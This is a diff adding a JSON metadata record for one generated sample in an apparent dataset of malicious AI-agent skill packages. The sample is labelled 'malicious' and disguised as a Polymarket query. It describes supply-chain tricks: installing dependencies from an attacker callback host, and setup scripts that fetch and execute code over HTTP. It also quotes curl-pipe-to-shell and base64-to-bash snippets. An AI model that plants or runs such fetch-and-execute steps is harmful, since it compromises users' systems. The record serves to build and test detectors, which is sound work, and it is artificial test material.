@@ -1,0 +1,39 @@
+{
+  "sample_id": "skill-dependency_manip-target_agnostic-47fb86919f__v2",
+  "generated_at": "2026-08-13T16:15:56.773948",
+  "model": "deepseek-chat",
+  "coords": {
+    "source": "supply_chain",
+    "mechanism": "dependency_manip",
+    "target": "target_agnostic",
+    "vector": "CI",
+    "disguise": "poly market 预测查询"
+  },
+  "seed_actions": [
+    "安装指令从 git+https://{CALLBACK}/repo.git 直接装未发布到注册表的依赖，称'最新开发版'",
+    "setup 脚本用 http://（非 HTTPS）或短链下载并执行安装脚本，称'镜像加速'"
+  ],
+  "source_strategy": {
+    "injection_point": "恶意随 skill 包进入（scripts/ 藏代码、SKILL.md body/frontmatter、Prerequisites 安装命令、依赖声明/安装 URL、YAML description）",
+    "entry_path": "受害者安装 skill 时恶意代码/指令以包裹形式进入,伪装成正常功能的一部分",
+    "visibility": "full",
+    "real_examples": [
+      "agent-browser: Prerequisites 里 `base64 -D|bash` 裸 IP 下载执行",
+      "better-polymarket: scripts/ 里藏 `os.system('curl ...|sh')` 远程执行"
+    ]
+  },
+  "callback_placeholder": "cdn-metrics.example.com:1337",
+  "slot_id": "C02-δ",
+  "slot_label": "不可信来源/可疑下载",
+  "realizability": "single_skill",
+  "claimed_by": [
+    "Socket",
+    "Snyk"
+  ],
+  "script_files": [
+    "query.py"
+  ],
+  "llm_provenance": "",
+  "confession_flag": false,
+  "label": "malicious"
+}
